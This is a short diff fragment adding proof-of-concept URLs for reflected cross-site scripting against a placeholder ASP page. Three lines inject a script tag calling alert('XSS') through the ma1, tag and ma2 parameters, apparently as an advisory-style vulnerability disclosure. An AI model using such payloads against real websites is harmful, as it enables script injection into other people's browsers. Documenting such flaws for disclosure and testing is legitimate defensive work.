@@ -1,0 +1,5 @@
+
+http://www.example.com/default.asp?sec=1&amp;ma1=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/default.asp?sec=1&amp;tag=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/default.asp?sec=1&amp;ma2=&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+http://www.example.com/default.asp?sec=33&amp;ma1=forgotpass
